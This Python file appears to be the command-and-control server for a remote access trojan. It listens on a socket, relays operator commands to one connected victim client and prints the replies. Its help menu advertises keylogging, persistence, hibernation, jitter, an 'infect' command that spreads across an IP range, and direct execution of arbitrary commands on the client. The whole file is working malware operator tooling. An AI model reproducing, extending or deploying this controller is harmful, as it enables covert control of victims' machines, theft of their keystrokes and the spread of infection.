import socket
import sys

def display_menu():
    print("\nCommand Menu:")
    print("1. cd [path]")
    print("2. keylog")
    print("3. persist")
    print("4. hibernate")
    print("5. jitter")
    print("6. infect <network_prefix> <target_port> <start_ip> <end_ip>")
    print("7. q")
    print("Enter custom commands to execute directly on client.\n")

def setup_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = ('127.0.0.1', 50000)
    sock.bind(server_address)
    sock.listen(5)
    print("Server is listening on port 50000...")
    return sock

def handle_client(client_socket, client_address):
    print(f"Connection from {client_address}")
    while True:
        command = input(f"* Shell#{client_address[0]}~$: ").strip()
        if command == "":
            print("Please enter something or try 'help' to see menu")
            continue
        if command.lower() == "help":
            display_menu()
            continue

        client_socket.sendall(command.encode())
        
        if command.startswith("q"):
            print("Terminating connection.")
            break
        else:
            receive_response(client_socket)

def receive_response(client_socket):
    try:
        response = client_socket.recv(4096).decode()
        if not response:
            print("Client disconnected.")
            return False
        print(response)
    except UnicodeDecodeError:
        print("Received non-UTF-8 data from client.")
    except socket.error as e:
        print(f"Error receiving data: {e}")
        return False
    return True

def main():
    sock = setup_server()
    try:
        client_socket, client_address = sock.accept()
        with client_socket:
            handle_client(client_socket, client_address)
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        print("Server shut down.")
        sock.close()

if __name__ == "__main__":
    main()
